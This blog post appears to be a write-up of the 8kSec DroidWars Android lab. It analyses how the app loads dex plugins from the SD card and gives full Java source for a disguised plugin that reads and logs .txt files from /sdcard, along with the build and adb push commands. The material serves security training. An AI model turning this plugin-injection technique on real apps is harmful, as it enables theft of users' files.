---
title:  "8kSec DroidWars Writeup"
date:   2025-09-12T16:33:00-0400
categories:
  - writeup
tags:
  - android
  - ctf
---


Hello everyone!
In this blog post , I will try to explain my solution steps for DroidWars challenge from 8kSec Android Labs. 

```
Goal:
Goal is to create a plugin that appears legitimate but contains hidden code that, when loaded in DroidWars, steals files stored on the SD card without requiring any additional permissions.
```

## Static Analysis

![](/assets/8ksec_droidwars_images/screen1.png)

Main function of application is showing game characters and their statistics on screen. Every character is a plugin file that loaded from spesific diretory on device. When we open the app in emulator, it shows a pikachu character as example. Also we can refresh the list, clear the plugins, check for malicious plugins and open the debug screen on main activity on settings screen. Lets start our analysis with jadx.

### Code Analysis

Manifest file have only one activity, MainActivity. In MainActivity code, `loadExternalPlugin` method is important for us.With `checkStoragePermissionAndLoadPlugins`, app checking for external storage access and after that it calls that function.

![](/assets/8ksec_droidwars_images/load_plugin.png)

`getAvaliablePlugins` method checks `/sdcard/PokeDex/plugins` directory for external plugins files with `.dex` file extension. If any dex file found, load it with `loadPlugin` method from `pluginLoader` class.

````java
public final PokemonPlugin loadPlugin(String pluginName)

...
...
...

DexClassLoader dexClassLoader = new DexClassLoader(file2.getAbsolutePath(), this.context.getDir("dex", 0).getAbsolutePath(), null, this.context.getClassLoader());
        setupOutputMonitoring();
        Object loadSimplePlugin = loadSimplePlugin(dexClassLoader, pluginName);
        if (loadSimplePlugin != null) {
            Log.d(TAG, "Successfully loaded SimplePlugin implementation");
            Function1<? super String, Unit> function14 = this.onLogMessage;
            if (function14 != null) {
                function14.invoke("Successfully loaded SimplePlugin implementation");
            }
            return new SimplePluginAdapter(loadSimplePlugin);
        }
        for (String str3 : CollectionsKt.listOf((Object[]) new String[]{pluginName + "Plugin", "MaliciousPlugin", StringsKt.removeSuffix(pluginName, (CharSequence) "_copy") + "Plugin", "com.eightksec.droidwars.plugin." + pluginName + "Plugin"})) {
            try {
                String str4 = "Attempting to load class: " + str3;
                Function1<? super String, Unit> function15 = this.onLogMessage;
                if (function15 != null) {
                    function15.invoke(str4);
                }
                loadClass = dexClassLoader.loadClass(str3);
            } catch (ClassNotFoundException unused) {
                String str5 = "Class not found: " + str3;
                Function1<? super String, Unit> function16 = this.onLogMessage;
                if (function16 != null) {
                    function16.invoke(str5);
                    Unit unit = Unit.INSTANCE;
                }

...
...
...
````
`loadPlugin` method generates DexClassLoader object from given dex files and calls `loadSimplePlugin` method with this class loader object.

````java
private final Object loadSimplePlugin(ClassLoader classLoader, String str) {
        Class<?> loadClass;
        for (String str2 : CollectionsKt.listOf((Object[]) new String[]{String.valueOf(StringsKt.removeSuffix(str, (CharSequence) "Plugin")), String.valueOf(str), "MaliciousPlugin"})) {
            try {
                String str3 = "Attempting to load SimplePlugin implementation: " + str2;
                Log.d(TAG, str3);
                Function1<? super String, Unit> function1 = this.onLogMessage;
                if (function1 != null) {
                    function1.invoke(str3);
                }
                loadClass = classLoader.loadClass(str2);
                Intrinsics.checkNotNull(loadClass);
            } catch (ClassNotFoundException unused) {
            ...
            ...
            //some error catch here
            ...
            ...
            }
            if (isSimplePluginImplementation(loadClass)) {
                String str6 = "Found SimplePlugin implementation: " + str2;
                Log.d(TAG, str6);
                Function1<? super String, Unit> function14 = this.onLogMessage;
                if (function14 != null) {
                    function14.invoke(str6);
                }
                classLoader = loadClass.newInstance();
                return classLoader;
            }
            Unit unit3 = Unit.INSTANCE;
        }
        return null;
    }


````
`loadSimplePlugin` method gets plugin name and remove the "Plugin" suffix from it if exist. After that it generate class name list and try to load them in for loop.

```java
// For example: Your plugin name is: TestPlugin.dex


CollectionsKt.listOf((Object[]) new String[]{String.valueOf(StringsKt.removeSuffix(str, (CharSequence) "Plugin")), String.valueOf(str), "MaliciousPlugin"})

// this code generate [Test,TestPlugin,MaliciousPlugin] list and loadClass function try to load them as class

```
But if we set our class name same with dex file name and  give our dex file name like "ClassName.dex or ClassNamePlugin.dex", loadClass method probably give "class not found" error. Because loadClass method use fully qualified class name. For loading the our class without error, we need to set our dex file name as `package_name.class_name.dex`

```
Example:

I will set my class name as 'Pwn'
My package name : 'com.eightksec.droidwars.plugin'

loadClass method expect a 'com.eightksec.droidwars.plugin.Pwn' for loading that class.

loadSimplePlugin method remove suffix from plugin name and use the result as class name, so i need to set my plugin file name as

'com.eightksec.droidwars.plugin.Pwn.dex' 

```
Also `loadSimplePlugin` method checks the plugin format with `isSimplePluginImplementation` method.

````java
private final boolean isSimplePluginImplementation(Class<?> cls) {
        try {
            Method method = cls.getMethod("getName", new Class[0]);
            Method method2 = cls.getMethod("getType", new Class[0]);
            Method method3 = cls.getMethod("getAllData", new Class[0]);
            if (Intrinsics.areEqual(method.getReturnType(), String.class) && Intrinsics.areEqual(method2.getReturnType(), String.class)) {
                return method3.getReturnType().isAssignableFrom(Map.class);
            }
            return false;
        } catch (Exception unused) {
            return false;
        }
    }
````
This method checks that if plugin contains `getName`,`getType` and `getAllData` methods and controls their return types. We have to implement our malicious plugin with this methods.

Here is my pwn plugin code:

```java
package com.eightksec.droidwars.plugin;

import java.util.*;
import java.util.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Pwn{

    public String getName() {
        code_exec();
        return "Mal";
    }

    public String getType() {
        return "Pwn";
    }

    public Map<String, Integer> getAllData() {
        Map<String, Integer> stats = new HashMap<>();
        stats.put("HP", 30);
        stats.put("Attack", 31);
        stats.put("Defense", 32);
        stats.put("Sp. Attack", 33);
        stats.put("Sp. Defense", 34);
        stats.put("Speed", 40);
        return stats;
    }

    private void code_exec(){
    try {
        String[] cmd = {
            "/system/bin/sh", "-c",
            "for file in /sdcard/*.txt; do printf '%s\\n' \"$file\"; cat \"$file\"; done"
        };
        Process process = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream())
        );
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println("Stolen data: " + line);
        }
        process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
}
```

I wrote `code_exec` method for shell command execution. I called it inside `getName` method because this method is called during listing the plugins. For creating dex file from java file, i got some help from stackoverflow and chatgpt :) 

```sh
$ javac Pwn.java

$ jar cvf Pwn.jar Pwn.class

$ ~/Android/Sdk/build-tools/32.0.0/d8 --output . Pwn.jar

$ mv classes.dex com.eightksec.droidwars.plugin.Pwn.dex

$ adb push com.eightksec.droidwars.plugin.Pwn.dex /sdcard/PokeDex/plugins

```
After pushing the plugin to plugin directory and start the app, we can see the logs that we send from our malicious plugin.

![](/assets/8ksec_droidwars_images/stolen.png)

In real life scenarios, instead of getting files, we can get reverse shell. Also we can put our malicious plugin via malicious application. But here thats enough :)

Thats all, see you!

PoC Video: [Youtube](https://youtu.be/iqDgs8dpDf8)
